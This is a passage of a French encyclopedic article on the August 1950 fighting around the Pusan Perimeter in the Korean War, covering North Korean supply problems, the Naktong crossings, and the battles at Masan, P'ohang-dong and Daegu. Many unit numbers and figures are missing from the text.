La suprématie de la Air Force dans le ciel de la Corée force les Nord-Coréens dans le premier mois de la guerre à recourir à des mouvements de nuit pour approvisionner la zone de combat. Ils utilisent principalement les chemins de fer pour convoyer les fournitures, cependant une pénurie de camions les oblige pour finaliser l'acheminement vers les unités sur le terrain à se servir de charrettes et de bêtes de somme. L'armée nord-coréenne réussit tout de même à maintenir ses lignes de ravitaillement vers le front malgré les frappes aériennes constantes. En effet, les Nations unies ne réussissent pas à arrêter totalement le transport ferroviaire militaire. Et les munitions et le carburant, mais en plus petites quantités qu'avant, continuent à arriver sur le front. Cependant, comme ces dernières sont prioritaires dans la logistique nord-coréenne, les soldats ne disposent au mieux que d'une à deux rations alimentaires par jour. La plupart des unités doivent vivre au moins partiellement sur la population sud-coréenne, en quête de nourriture et d'approvisionnement durant la nuit. Au septembre la situation alimentaire est si mauvaise pour les troupes sur le front que la plupart des soldats sont affaiblis et montrent une perte d'endurance et d'efficacité au combat.
Pour l'armée nord-coréenne, l'inefficacité de sa logistique est une faiblesse fatale, qui lui coûte des défaites cruciales après ses succès initiaux au début du conflit. Les moyens de communication et d'approvisionnement nord-coréens ne sont en effet pas capables d'exploiter une percée et de soutenir une attaque continue en face de massives réponses blindées, aériennes, et d'artillerie qui peuvent être concentrées sur ses troupes en situation critique.
Poussée d'août.
Mise en place du périmètre.
Le août, la américaine émet une directive opérationnelle à toutes les forces terrestres de l'ONU en Corée pour leur retrait prévu à l'est du fleuve Nakdong. Les unités de l'ONU sont alors chargées d'établir des positions défensives derrière ce qui va devenir le périmètre de Busan. Le but est de constituer une ligne de défense pour tenir à distance de l'Armée populaire de Corée pendant que l'armée américaine attend les renforts et reconstruit ses forces afin de lancer une contre-offensive. Le périmètre est la dernière ligne de défense pour les forces de l'ONU qui n'ont connu que des défaites au cours du premier mois de la guerre; tout recul supplémentaire coûterait de lourdes pertes à la armée. La d'infanterie américaine tient le flanc sud à Masan, tandis que la d'infanterie se replie sur Koch'ang. La de cavalerie se positionne à Waegwan. Les forces américaines ont démoli tous les ponts au-dessus du fleuve Nakdong dans leur retraite. Et lors de la destruction d'un de ces ponts, le commandant de la de cavalerie tente à plusieurs reprises d'évacuer les réfugiés le traversant, mais ces derniers continuent à affluer malgré les avertissements et plusieurs tentatives pour dégager le pont. Finalement, le commandant est contraint de démolir le pont, entrainant la mort de plusieurs centaines de réfugiés dans la destruction.
Le cœur du plan de défense de l'ONU prévoit de tenir le port de Busan, où les approvisionnements et renforts terrestres vitaux arrivent du Japon et des États-Unis. Busan possède aussi un aérodrome où les avions de combat et cargo peuvent ravitailler la Corée en fournitures. L'installation de grues lourdes sur les quais de Busan permet de faciliter la manipulation des armes lourdes et des marchandises, réduisant le besoin de ravitaillement par le pont aérien. Un système similaire au Red Ball Express de la Seconde Guerre mondiale, est mis en place pour convoyer les fournitures de Busan vers les lignes de front. Des centaines de navires arrivent à Busan chaque mois, le trafic compte 230 navires en juillet et en augmente de façon constante par la suite. Le 24 juillet l'ONU établit son haut-commandement à Tokyo au Japon avec à sa tête le Général de l'Armée Douglas MacArthur. Les forces nord-coréennes dans l'intervalle souffrent de lignes d'alimentation trop étendues qui réduit sévèrement leur capacité de combat.
Les forces nord-coréennes ont quatre itinéraires possibles vers le périmètre: au sud, le passage à travers la ville de Masan autour de la confluence de la Nam et du fleuve Nakdong; une autre voie au sud à travers le Nakdong et les lignes de chemin de fer à Miryang; par la route à Daegu dans le Nord; et à travers Gyeongju dans le corridor Est. La Corée du Nord monte une grande offensive en août, attaquant simultanément ces quatre points d'entrées dans le périmètre. La bataille du périmètre de Busan comprend donc plusieurs engagements entre les divisions de l'ONU et les forces de la Corée du Nord le long du périmètre.
Contre offensive américaine.
La , commandée par le lieutenant-général Walton Walker, prépare une contre-offensive pour août, la première menée par l'ONU dans la guerre. Elle doit débuter par une attaque des unités de réserve américaines sur la zone Masan pour sécuriser Chinju contre la nord-coréenne puis elle doit être suivie par une grande offensive générale sur la rivière Kum au milieu du mois. Un des objectifs de Walker est de briser la concentration suspectée de troupes ennemies à proximité de la zone de Taegu en détournant certaines unités nord-coréennes vers le Sud. Le 6 août, la émet la directive opérationnelle de l'attaque à la Task force Kean, nommée d'après le commandant de la d'infanterie, William B. Kean. La Task Force Kean est composée de la , privé du d'infanterie et d'un bataillon d'artillerie de campagne, mais à laquelle on adjoint le d'infanterie et la d'infanterie des Marines soit une force d'environ . Le plan d'attaque implique que la Task Force se déplace vers l'Ouest à partir de positions tenues près de Masan, saisisse le col de Chinju, et fixe la ligne sur la rivière Nam. Cependant, l'offensive s'appuie sur l'arrivée de l'ensemble de la d'infanterie, ainsi que sur trois autres bataillons de chars américains.
La Task Force Kean lance son attaque le 7 août, s'élançant depuis Masan. Au Notch, une passe au nord de la ville et le lieu d'une bataille précédente, le d'infanterie rencontre d'infanterie nord coréens, et les vainc. La Task Force avance rapidement jusqu'à Pansong, infligeant supplémentaires et prend le quartier général de la nord-coréenne. Cependant, le reste de l'avancée américaine est ralenti par la résistance de l'ennemi. La Task Force Kean doit forcer sur la zone de Chindong-ni, dans une bataille confuse où les forces dispersées doivent compter sur un fort soutien aérien afin de conserver l'avantage. De plus, l'offensive de Kean entre en collision avec des éléments de la nord-coréenne et doit se battre simultanément sur les deux fronts.
De violents combats perdurent dans la zone pendant trois jours. Le 9 août, la Task Force Kean est prête à reprendre Chinju. Soutenus par un appui aérien, les Américains avancent rapidement malgré la forte résistance nord-coréenne. Le 10 août, les Marines, qui ont pris de l'avance, découvrent par inadvertance le motorisé de la blindée de la Corée du Nord. Les F4U Corsair de la 1st Marine Aircraft Wing frappent à plusieurs reprises la retraite des Nord-Coréens, infligeant et détruisant une centaine de véhicules du régiment. Cependant, la des Marines est retirée de la force le 12 août afin d'être redéployés ailleurs sur le périmètre. La Task Force Kean continue à avancer, soutenue par la puissance de feu de la marine et l'artillerie de campagne et capture la zone autour de Chondong-ni. Cependant, la demande à plusieurs de ses unités de se redéployer depuis Daegu ailleurs sur le front, en particulier sur le Nakdong.
La de la d'infanterie, qui s'est embourbée dans la vallée dans la nuit du 10 au 11 août, est attaquée dans la matinée par les Nord-Coréens. Dans la confusion, les blindés nord-coréens sont en mesure de pénétrer les barrages routiers et les positions d'artillerie américaines. L'attaque surprise est couronnée de succès en anéantissant presque les et d'artillerie de campagne, avec leur équipement. Les blindés des deux camps s'affrontent et même si les Américains disposent du soutien de l'aviation des Marines, aucune des deux parties n'est en mesure de prendre le dessus malgré des pertes massives dans les deux camps. À plusieurs reprises, les forces américaines échouent à reprendre les positions d'artillerie envahies par les Nord-coréens, souffrant de nombreuses victimes. Quelque temps plus tard, alors qu'ils ont repris le contrôle de la zone, les Américains retrouvent les corps de exécutés, 55 du d'artillerie de campagne et 20 du d'artillerie de campagne. La Task Force Kean est forcée de se replier vers Masan, incapable de tenir ses positions, et le 14 août, elle tient à peu près les mêmes positions qu'au début de l'offensive.
La Task Force Kean échoue donc dans son objectif de détourner du Nord les troupes nord-coréennes, et également dans son objectif d'atteindre le col à Chinju. L'offensive a cependant permis d'augmenter de façon significative le moral des troupes de la d'infanterie, qui s'est donné corps et âmes dans les engagements ultérieurs. La nord-coréenne est réduite à ou et doit reconstituer ses rangs avec des conscrits sud-coréens d'Andong. Les combats dans la région continuent pour le reste du mois.
Nakdong Bulge.
À environ au nord de la confluence de la rivière Nam et du fleuve Nakdong, ce dernier se courbe vers l'Ouest en face de Yongsan dans une large boucle semi-circulaire (le "Nakdong Bulge"). À cette époque, le Nakdong mesure de largeur et de profondeur, permettant à l'infanterie de traverser à gué malgré quelques difficultés, mais empêchant les véhicules de traverser sans aide. Ce périmètre est recouvert par un réseau de postes d'observation sur les hauteurs d'où les forces américaines de la d'infanterie, sous les ordres du major-général John H. Church, surveillent la zone de la rivière. Les forces en réserve se préparent à contrecarrer toute tentative de franchissement par des unités Nord-coréennes. L'artillerie et les mortiers sont également répartis afin de pouvoir concentrer une grande puissance de feu sur une zone donnée. La division déjà en sous-effectif est extrêmement étirée le long du front, rendant la ligne relativement fragile.
Traversée des Nord-coréens.
À minuit dans la nuit du 5 au 6 août, Nord-coréens du , , traversent le fleuve au niveau d'Ohang, à au sud de Pugong-ni et à l'ouest de Yongsan, portant des armes légères et transportant les provisions sur leurs têtes ou des radeaux. Une deuxième force essaye de traverser le fleuve plus au nord, mais elle est frappée avec de l'artillerie et des tirs de mitrailleuses, et se replie dans la confusion. À 02h00 le matin du 6 août, les Nord-coréens commencent à engager les forces du , d'infanterie, mais poursuit son avancée après un petit combat, afin de pénétrer les lignes à Yongsan. L'infanterie nord-coréenne refoule le et ce dernier doit abandonner son poste de commandement pour consolider ses positions. L'attaque nord-coréenne prend au dépourvu les Américains qui s'attendaient à une attaque plus au nord. Conséquemment, les Coréens capturent une grande quantité d'équipements américains. La force de l'attaque menace de rompre les lignes américaines et d'interrompre les lignes d'approvisionnement vers le Nord.
Le quartier général du régiment ordonne alors au de contre-attaquer les Nord-coréens. Alors que le arrive à l'ancien poste de commandement du , il est pris en embuscade par des soldats nord-coréens situés sur des positions plus élevées. Les plus lourdes pertes sont assumées par la compagnie C, la première unité du bataillon à atteindre le poste. Plus de la moitié de la compagnie est mise hors service durant les combats. Les compagnies A et B contre-attaquent les positions nord-coréennes avec des chars et des véhicules blindés secourant la compagnie C assiégée. Vers 20 heures, la compagnie A établit le contact par radio avec la compagnie L du , toujours sur ses positions près de la rivière, et signale que les Nord-Coréens ont pénétré vers l'Est au Nord de la route de Yongsan-Nakdong sur une position surélevée connue comme Cloverleaf Hill, mais qu'ils n'ont pas encore traversé au sud de la route d'Obong-ni Ridge. Les Nord-coréens ont pénétré à à l'est du Nakdong et à mi-chemin de Yongsan.
La contre-attaque américaine continue dans la matinée du 7 août, mais les gains sont faibles, entravés par le temps chaud et un manque de nourriture et d'eau. Les Nord-Coréens réussissent à aller de l'avant et à regagner Cloverleaf Hill et Oblong-ni Ridge, position critique à califourchon sur la route principale dans la zone du renflement ("Bulge"). À 16h00 ce jour-là, le d'infanterie, d'infanterie, une unité nouvellement arrivée, est envoyée sur zone. John H. Church lui ordonne d'attaquer immédiatement la zone du renflement. Les troupes de la d'infanterie sont fraîches, bien équipées et bien reposées. Cependant, ils sont aussi inexpérimentés, beaucoup d'entre eux étant réservistes. Et malgré une attaque tenace, le d'infanterie n'est seulement en mesure de regagner qu'une partie de Cloverleaf Hill avant que d'intenses combats ne calent son mouvement.
Afin de détruire la tête de pont nord-coréenne, Church réunit une grande force autour du d'infanterie. Surnommé Task Force Hill, cette force comprend les , et d'infanterie ainsi que le , d'infanterie, ainsi qu'un soutien de l'artillerie et d'autres unités rattachées. Il doit pousser les Nord-Coréens depuis la rive Est du fleuve, le 11 août. Le commandant de la Task Force Hill est le colonel John G. Hill, commandant du d'infanterie.
Mais dans l'intervalle, la nord-coréenne, qui a terminé la veille, la construction d'un pont à partir de sacs de sable, de rondins et de rochers, déplace ses camions et l'artillerie lourde à travers la rivière, ainsi que de l'infanterie supplémentaire et quelques chars. Au matin du 10 août, deux régiments nord-coréens occupent des positions fortifiées à travers le fleuve alors que l'approvisionnement continue à affluer. La Task Force Hill lance son attaque, mais elle est incapable de progresser en raison de l'artillerie nouvellement positionnée. Alors qu'elle devait frapper rapidement, la Task Force doit maintenant tenir sa position, et à la nuit tombée toute la nord-coréenne est sur le fleuve. Le même jour, certaines de ces unités ont commencé à manœuvrer vers le Sud et les lignes américaines afin de déborder la Task Force Hill. Le lendemain, des éléments épars de forces nord-coréennes attaquent Yongsan. Durant la nuit, les unités Nord-coréennes répètent l'attaque à plusieurs reprises contre les lignes américaines, alors que les soldats américains sont au repos et résistent avec plus de difficulté.
Défaite des Nord-coréens.
La provisoire des Marines, en collaboration avec la Task Force Hill, monte une offensive massive sur Cloverleaf Hill et Obong-ni. Soutenue par l'aviation et l'artillerie, l'offensive débute à 08h00 le 17 août. Les forces américaines lancent tout ce qu'ils ont à leur disposition contre les positions nord-coréennes : artillerie, mortiers, frappes aériennes et chars M26 Pershing lancent leurs frappes en soutien à l'infanterie et aux Marines.
La défense furieuse nord-coréenne arrête initialement la poussée des Marines. L'artillerie américaine doit ratisser Cloverleaf Hill pour forcer les Nord-Coréens à sortir de leurs positions avant que les Marines et la Task Force Hill puissent avancer sur Obong-ni, et, finalement, submerger les Nord-Coréens, une colline à la fois. Ils ont d'abord détruit la résistance sur les pentes d'Obong-ni avec une frappe aérienne et un tir de barrage des chars américains, mais une forte résistance cause un grand nombre de victimes parmi les Marines, qui doivent se retirer après leur première attaque. Dans la foulée, le coréen, chargé de la colline, monte une contre-attaque désastreuse dans l'espoir de repousser définitivement les Marines. La tactique de couper les voies d'approvisionnement en se fondant sur la surprise, qui avait donné tant de succès depuis le début de la guerre, ne fait plus le poids devant la massive supériorité numérique américaine.
À la nuit tombée, le 18 août, Obong-ni et Cloverleaf Hill sont repris par les forces américaines. La nord-coréenne est anéantie par les forces américaines ; un grand nombre de déserteurs ayant affaibli ses effectifs au cours de la bataille. Des groupes épars de soldats nord-coréens fuient à travers le Nakdong, poursuivis par l'aviation américaine et des tirs d'artillerie. Le lendemain, les restes de la se sont complètement retirés du fleuve. Dans leur retraite précipitée, ils ont laissé un grand nombre de pièces et de matériel d'artillerie utilisés par la suite par les Américains.
Corridor Est.
Le terrain le long du front sud-coréen sur le corridor de l'Est rend les mouvements extrêmement difficiles. La route principale court de Daegu, à l'est, à P'ohang-dong sur la côte Est de la Corée. La seule route principale nord-sud coupant cette ligne court d'Andong à Yongch'on, à mi-chemin entre Daegu et P'ohang–dong. La seule autre entrée est la ville d'An'gang-ni, à à l'ouest de P'ohang-dong, située près d'une vallée au terrain accidenté et de la principale plaque tournante ferroviaire de Gyeongju, un poste de transit pour l'acheminement de l'approvisionnement vers Daegu. Walker choisit de ne pas renforcer outre mesure la zone, pensant celle-ci bien protégée des attaques par la nature du terrain. Il prévoit de répondre à une attaque éventuelle par l'envoi de renforts et une couverture aérienne effectuée depuis l'aérodrome de Yongil, au sud de P'ohang-dong.
Triple offensive.
Au début août, trois divisions nord-coréennes montent des offensives contre les trois passages vers la région ; la attaque Yongch'on, la attaque P'ohang-dong et la en conjonction avec le d'infanterie indépendant, attaque An'gang-ni. L'attaque de la , qui manœuvre vers Yongch'on depuis Uiseong, est bloquée presque immédiatement. La poussée échoue à atteindre le couloir Daegu - P'ohang après avoir été surprise et débordée par la sud-coréenne. Ce combat est si lourd que la nord-coréenne est contrainte de maintenir sa position pendant une semaine avant d'essayer d'avancer. Bloquée par la résistance sud-coréenne, elle doit attendre des renforts. Cependant, les deux autres attaques nord-coréennes ont plus de succès, prenant les forces de l'ONU par surprise.
À l'Est des , la nord-coréenne traverse le fleuve Nakdong à Andong, se déplaçant à travers les montagnes en petits groupes afin d'atteindre P'ohang-dong. La division est en sous-effectif et une partie de ses canons est renvoyée vers le Nord par manque de munitions. Mais les stratèges de l'ONU n'avaient pas prévu que la serait en mesure de traverser le fleuve de manière efficace, et se sont retrouvés dépourvus devant l'infiltration massive des Nord-coréens dans la zone. Dans l'intervalle, la sud-coréenne est lourdement engagée contre la nord-coréenne le long de la route côtière vers P'ohang-dong. Les principaux affrontements se concentrent sur la ville de Yongdok, qui est prise plusieurs fois par les belligérants. Le 5 août, les Nord-Coréens lancent leur attaque, prenant à nouveau la ville aux forces sud-coréennes et repoussant ces derniers vers le Sud. À 19 h 30, le 6 août, la Corée du Sud lance une contre-offensive pour reprendre la ville. Les aéronefs et les navires américains pilonnent la ville avec des roquettes, du napalm et des obus d'artillerie avant que les troupes sud-coréennes des 22 et 23 régiments déferlent sur la ville. Cependant, les forces de la réussissent à infiltrer la route côtière au sud de Yongdok à , encerclant la , et les piégeant à quelques kilomètres au Nord de P'ohang-dong. Le indépendant avance autour de la sud-coréenne et prend la zone autour P'ohang-dong.
Le 10 août, la met en place la Task Force P'ohang, constituée des , , et sud-coréens ainsi que du antiguérilla, d'un bataillon de Marines et d'une batterie extraite du américain d'artillerie de campagne. La Task Force a pour mission de nettoyer la zone montagneuse des forces nord-coréennes. Dans le même temps, la forme aussi la Task Force Bradley, constituée d'éléments du d'infanterie américain, , sous le commandement du général de brigade Joseph S. Bradley, assistant du commandant de la division. Elle comprend un bataillon du , une compagnie de tanks, un bataillon de génie militaire, une batterie d'artillerie, une batterie antiaérienne et des unités de support médical et radio. La Task Force Bradley est chargée de défendre P'ohang-dong contre le indépendant qui a infiltré la ville. Il s'ensuit une série de combats à travers une large région autour de P'ohang-dong et d'An'gang-ni, où les forces terrestres sud-coréennes, aidées par les forces aériennes américaines engagent les Nord-coréens partout dans le voisinage. La nord-coréenne qui opère dans la vallée à l'ouest de P'ohang-dong, réussit à repousser la Task Force P'ohang et la division Capitale. Dans le même temps, le d'infanterie et des éléments de la nord-coréenne combattent la Task Force Bradley au sud de P'ohang-dong. L'artillerie navale américaine repousse les troupes nord-coréennes hors de la ville, mais les combats se durcissent à l'approche des collines environnantes, transformant la zone en no man's land.
Combat pour P'ohang-dong.
Le 13 août, les troupes nord-coréennes opèrent à l'ouest des montagnes et sud-ouest de l'aérodrome de Yongil. Les commandants de l'US Air Force, qui se méfient d'une attaque de l'ennemi, font évacuer les 45 P-51 des et américains contre la volonté du général MacArthur. La piste d'atterrissage est cependant demeurée sous la protection des forces terrestres de l'ONU et n'est jamais tombée sous le feu direct de l'ennemi. Les escadrons ont été déplacés à sur l'Île de Kyūshū, au Japon. Dans l'intervalle, la sud-coréenne doit évacuer ses positions après avoir été encerclée par la nord-coréenne. La division manœuvre vers le Sud, à proximité du village de Changsha-dong, où les stratèges de l'US Navy préparent l'évacuation de la division par LST et DUKW. L'évacuation est effectuée dans la nuit du 16 août sous le couvert de l'artillerie navale. Près de de la , de la police nationale et plus de civils évacuent sous la protection des navires du contre-amiral Charles C. Hartman. La division navigue sur et débarque au sud de la baie de Yongil afin de rejoindre les autres forces de l'ONU et de mener une attaque coordonnée contre les Nord-coréens.
Le 14 août, l'essentiel des forces des et nord-coréennes, ainsi que le indépendant, se concentrent entièrement à la prise de P'ohang-dong. Cependant, ils sont incapables de tenir face à la supériorité aérienne des États-Unis et le bombardement naval sur la ville. De plus, la chaîne d'approvisionnement nord-coréenne est complètement en panne, et les Nord-coréens manquent de nourriture, de munitions et d'un grand nombre d'autres fournitures. Le 15 août, les forces de l'ONU commencent leur contre-offensive finale contre les forces nord-coréennes alors au point mort. D'intenses combats autour P'ohang-dong suivent pendant plusieurs jours et chaque camp subit un grand nombre de pertes. Le 17 août, les forces des Nations unies sont en mesure de repousser les troupes nord-coréennes en dehors des zones de Gyeongju et d'An'gang-ni, en mettant la route d'approvisionnement vers Daegu hors de danger immédiat. Le indépendant, réduit à , est contraint de se retirer au nord pour ne pas être encerclé. La nord-coréenne, également réduite à , évacue P'ohang-dong après avoir été subi de lourdes pertes. Les deux unités fusionnent par la suite pour former en additionnant aussi de nouvelles recrues, la forte de . Le 19 août les forces nord-coréennes se sont complètement retirées de la zone.
Daegu.
Peu de temps avant le début de la bataille périmètre de Busan, Walker établit à Daegu le quartier général de la . À l'intérieur du périmètre de Busan, Daegu se tient à l'entrée de la vallée du fleuve Nakdong, une zone où les forces nord-coréennes pourraient progresser en grand nombre. Les barrières naturelles fournies par le Nakdong au sud et un terrain montagneux au nord convergent autour de Daegu, qui est aussi la principale plaque tournante du transport et la dernière ville sud-coréenne majeure en dehors de Busan elle-même à demeurer dans les mains de l'ONU. Du sud au nord, la ville est défendue par la de cavalerie américaine, et les et du d'armée sud-coréen. La de cavalerie est positionnée le long du fleuve Nakdong au sud, avec ses et de cavalerie tenant de front le long de la rivière et le en réserve avec les forces d'artillerie, prêts à renforcer partout où un passage pourrait être tentée par les Nord-coréens.
La poussée sur Daegu.
Cinq divisions nord-coréennes se concentrent afin de lancer une offensive contre les forces de l'ONU à Daegu ; du sud au nord, les , , , et divisions occupent une ligne qui court de Tuksong-dong à Waegwan et Kunwi. Les Nord-Coréens prévoient d'utiliser le corridor naturel de la vallée du Nakdong de Sangju à Daegu comme axe principal d'attaque pour leur prochaine poussée vers le sud. Les éléments de la blindée soutiennent également l'attaque.
Dans la nuit du 4 au 5 août, la nord coréenne commence à traverser le Nakdong à Naktong-ni, à au nord-ouest de Daegu. La traversée n'est découverte que le 5 août par les forces sud-coréennes qui lancent des tirs d'artillerie et de mortier pour tenter de contrer la traversée. Les soldats nord-coréens pataugent à travers le fleuve transportant des armes et de l'équipement sur leurs têtes. Trois régiments de la division traversent à pied et en radeau au cours de trois nuits ; l'ensemble de la division ayant traversé au 7 août, à quelques miles des défenses préparées par la de la République de Corée. Les troupes sud-coréennes attaquent la immédiatement après que cette dernière ait achevé sa traversée, forçant les troupes nord-coréennes à se disperser dans les montagnes. La division se reforme finalement à l'Est et lance une attaque de nuit concertée, brise les défenses sud-coréennes, et commence une avancée qui porte à au sud-est de Naktong-ni sur la route principale de Daegu. En une semaine, les et nord-coréennes convergent sur la zone de Tabu-dong, à environ au nord de Daegu.
De son côté, la nord-coréenne reçoit en renfort au Kumch'on le 5 août, ce qui porte sa force à environ . Le lendemain, son marche au nord-est vers le fleuve Nakdong. Le régiment traverse le 7 août et la rivière au sud-est de cette ville, pour se prévenir des attaques de l'aviation onusienne. Après avoir traversé le fleuve, le régiment se dirige vers les montagnes, ne rencontrant initialement aucune opposition de l'ONU. Les deux autres régiments, le et le , partent de Kumch'on plus tard et commencent à traverser la Nakdong entre Indong et Waegwan avant l'aube du 8 août, après la construction de pont pour leurs véhicules. Les Nord-Coréens soutiennent les opérations de traversée avec la puissance de feu de leurs chars situés sur la rive ouest du fleuve. Les chars traversent à leur tour pendant la journée. La saisit les collines 201 et 346 sur la rive Est du fleuve sur leur point de passage, avant d'avancer vers l'Est dans les montagnes en direction de Tabu-dong, à . Le lendemain, la sud-coréenne reprend les hauteurs sur les sites de passage, forçant les forces nord-coréennes à avancer plus à l'Est dans les montagnes. Entre le 12 et le 16 août, les trois régiments de la se réassemblent sur la rive Est du Nakdong dans les environs de Yuhak-san, à à l'est du site de franchissement et à au nord-ouest de Tabu-dong. La est cependant rapidement bloquée dans un combat sur Yuhak-san avec la de la République de Corée.
Triangulation Hill.
Au Sud de Waegwan, deux autres divisions nord-coréennes se tiennent prêtes à traverser le Nakdong dans une attaque coordonnée avec les divisions situées au nord. L'expérimentée nord-coréenne se masse dans le voisinage de Songju, tandis que la est concentrée dans la zone de Koryong. Ces deux divisions traversent sur la ligne de la de cavalerie américaine. Le de la commence à traverser le Nakdong à environ 03h00 le 9 août près de Noch'on, à au sud du pont de Waegwan. Lorsqu'il découvre la tentative de traversée, les éléments du de cavalerie ouvrent le feu contre les Nord-Coréens avec le soutien de l'artillerie. Bien que le régiment nord-coréen ait subi quelques pertes, la majeure partie de celui-ci atteint la rive Est et s'infiltre en toute sécurité dans les collines. Trente minutes plus tard, les et nord-coréens commencent à traverser la rivière plus au sud. Maintenant pleinement alerté, le de cavalerie et tous ses mortiers avec le soutien de l'artillerie, déciment les deux régiments et les refoulent sur la rive Ouest. Seul un petit nombre de Nord-Coréens réussit à atteindre la rive Est avant d'être capturé ou de se cacher pour retraverser la rivière la nuit suivante.
À l'aube du 9 août, le commandant de la de cavalerie, le major-général Hobart R. Gay en poste à Daegu, apprend la traversée de l'ennemi dans le secteur de sa division au sud de Waegwan. Comme les premiers rapports sont vagues, il décide d'attendre jusqu'à ce qu'il en apprenne plus sur la situation. Il découvre rapidement que près de d'infanterie nord-coréens se rassemblent sur la colline 268 (également connue comme "Triangulation Hill"), qui se situe à au sud-est de Waegwan et à au nord-ouest de Daegu. Gay ordonne à sa division de contre-attaquer la concentration ennemie pour les forcer à travers la rivière. Gay et Walker croient que l'attaque nord-coréenne pourrait être une feinte et qu'une plus grande attaque pourrait venir du Nord. En outre, la colline est importante par sa proximité avec les lignes de communication. La principale route coréenne nord-sud et le principal chemin de fer à double voie Séoul-Busan longent le pied de la colline.
À 12h00, l'artillerie américaine commence un tir de barrage préparatoire sur la colline 268, alors que le lance son attaque, avec l'ordre de continuer sur le sud-ouest de la colline 154. La colline 268 est recouverte de broussailles épaisses hautes de et d'arbres de 2 à de hauteur. Les Nord-Coréens repoussent l'attaque. Le lendemain matin, le 10 août, les frappes aériennes et le barrage d'artillerie secouent la colline 268 et dévastent le bataillon nord-coréen. Pris au piège entre les bombes aériennes et les obus d'artillerie, ils commencent à quitter leurs positions. Une attaque d'infanterie américaine atteint sans peine le sommet de la colline et la bataille se termine à 16h00. L'artillerie américaine et les tirs de mortier se déplacent alors vers l'Ouest afin de couper la retraite nord-coréenne. Les obus au phosphore blanc tirés par le d'artillerie permettent de fixer les Nord-coréens dans un village alors qu'ils tentent de battre en retraite. Ils sont mis en déroute par l'infanterie américaine, accusant plus de . Ce soir-là, le du de cavalerie, retourne en réserve de la division, et des éléments du de cavalerie finissent de sécuriser la colline 268. On estime que se sont retirés à travers le fleuve dans la nuit du 10 au 11 août. La tentative de la nord-coréenne pour traverser le Nakdong au sud de Waegwan prend fin de manière catastrophique. Lorsque les survivants du rejoignent enfin la division vers le 12 août, la décompte seulement quelque . L'armée nord-coréenne place la division en réserve afin de la reconstruire.
Yongp'o.
Le plan nord-coréen pour l'attaque contre Daegu depuis l'Ouest et le Sud-ouest exige que la nord-coréenne attaque de manière coordonnée avec la . La doit traverser le Nakdong dans les environs de Tuksong-dong, et pénétrer à l'Est, afin de couper la principale route d'approvisionnement des forces de l'ONU entre Busan et Daegu. La division se rassemble dans la zone Koryong le 11 août. Plus au nord, le nord coréen, une composante de la , commence à traverser le Nakdong à environ 03h00 le 12 août, dans les environs de Tuksong-dong, sur la route Koryong-Daegu. Le du de cavalerie est chargé de couvrir ce site situé à au sud-ouest de Daegu. À la lumière du jour, une force nord-coréenne de pénètre à Wich'on-dong et la compagnie H du américaine s'engage dans un combat rapproché. Dans une attaque à la grenade et aux armes automatiques, les Nord-coréens envahissent les positions avancées de la compagnie, le poste d'observation et de mortier, et les positions de mitrailleuses lourdes. Les Nord-coréens tentent de contrôler les hauteurs à l'est de Yongp'o afin d'assurer la protection de la traversée principale qui doit suivre. Cependant, à 9h00, le , soutenus par le d'artillerie et des frappes aériennes, éconduisent et dispersent les troupes nord-coréennes de Yongp'o.
En trois jours, du 10 au 12 août, en raison du manque de pluie, le niveau du fleuve Nakdong chute de près d'un mètre pour atteindre le niveau des épaules à de nombreux endroits rendant les tentatives de traverser beaucoup plus facile. Tôt le matin le 14 août, les Nord-coréens tentent alors une traversée du Nakdong en force dans le voisinage du pont soufflé entre Tuksong-dong et Yongp'o. L'artillerie nord-coréenne et les tirs de char depuis la rive ouest du fleuve soutiennent la traversée de l'infanterie. Un grand nombre de renforts nord-coréens traverse dans des barges à proximité du pont, sous le feu des frappes aériennes américaines et de l'artillerie. L'attaque est bloquée à Samuni-dong, à au-delà du pont détruit. Là, le feu combiné des armes, des mortiers et de l'artillerie les repoussent vers le fleuve. À 12h00, de larges groupes de Nord-Coréens essayent de repasser le fleuve du côté ouest sous le feu de l'artillerie américaine, provoquant un grand nombre de victimes. À la nuit tombée, le de cavalerie a éliminé la tête de pont nord-coréenne de Yongp'o. Le estime que sur les nord-coréens qui ont réussi à traverser le fleuve, 1500 ont été tués. Lors de sa première mission de combat, la traversée du Nakdong, la nord-coréenne souffre de .
Tapis de bombes.
Dans les montagnes au nord-est de Waegwan et de la colline 303, la de la République de Corée continue de subir les attaques nord-coréennes à la mi-août. La pression nord-coréenne contre la division sud-coréenne est quasiment continue. Sous le commandement du général de brigade Paik Sun-yup, cette division s'est battue dans un combat extrêmement sanglant pour la défense des montagnes proches de Daegu. Les planificateurs américains s'attendent à ce que la principale attaque nord-coréenne vienne de l'Ouest, et ils massent leurs forces à l'ouest de Daegu. En effet, ils croient à tort que nord-coréens s'amassent près de Daegu. Cette estimation est en fait bien supérieure au nombre réel de soldats présent dans la zone, la Corée du Nord, ne disposant que de sur l'ensemble du périmètre.
Le 14 août, le général MacArthur ordonne au lieutenant-général George E. Stratemeyer de procéder à un tapis de bombes sur une zone rectangulaire de sur la rive ouest du Nakdong en face de la sud-coréenne. Les services de renseignements estiment que la plus grande concentration de troupes ennemies se trouve dans cette zone, soit environ quatre divisions ennemies et plusieurs régiments blindés qui préparent leur attaque sur Daegu. Stratemeyer ne pense pas que ses avions aient des chances de réussir à bombarder une surface supérieure à , mais il se conforme aux ordres de MacArthur. À 11 h 58, le 16 août, les bombardiers lancent à d'altitude environ de bombes de 500 et sur la zone. L'attaque exige la mobilisation de l'ensemble de la composante de bombardement de la FEAF qui largue en tout 3084 bombes de () et 150 bombes de (). Cette opération est la plus grande opération de forces aériennes depuis la bataille de Normandie lors de la Seconde Guerre mondiale.
Le lendemain, le général Walker rapporte à MacArthur que les dommages causés aux nord-coréens par le bombardement ne peuvent être évalué en raison de la fumée et de la poussière, et que les forces terrestres ne peuvent atteindre la zone en raison des tirs ennemis. Les informations obtenues plus tard de prisonniers nord-coréens révèlent que les divisions ennemies que les Américains pensaient être encore à l'Ouest du Nakdong, avaient en fait déjà traversé du côté Est et n'étaient plus dans la zone bombardée. Aucune preuve ne permet d'affirmer que le bombardement ait tué une seule soldat nord-coréen. Cependant, le bombardement semble avoir détruit un nombre important de batteries d'artillerie nord-coréennes. Les commandants terrestres et aériens de l'ONU se sont ensuite opposés à de futurs bombardements massifs contre les troupes ennemies, sans informations précises sur les concentrations de troupes et que la situation soit critique. Au lieu de cela, ils recommandent l'utilisation des chasseurs-bombardiers et des bombardiers en piqué pour soutenir les forces terrestres. Ils ont par la suite annulé un second bombardement d'une zone à l'est du Nakdong, prévue pour le 19 août.
Septembre : la grande offensive du Nakdong.
Planification.
